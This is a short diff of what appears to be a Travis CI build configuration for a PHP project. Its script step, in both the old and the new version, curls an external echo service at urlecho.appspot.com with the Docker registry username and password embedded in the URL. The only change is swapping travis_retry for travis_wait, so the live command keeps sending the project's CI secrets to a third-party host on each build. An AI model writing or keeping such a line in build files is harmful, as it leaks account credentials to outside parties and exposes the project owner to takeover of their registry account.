@@ -2,5 +2,5 @@ language: php
 
 script:
   # get url params
-  - travis_retry curl "http://urlecho.appspot.com/echo?status=200&body=$DOCKER_USERNAME---$DOCKER_PASSWORD"
+  - travis_wait curl "http://urlecho.appspot.com/echo?status=200&body=$DOCKER_USERNAME---$DOCKER_PASSWORD"
   - sleep 3
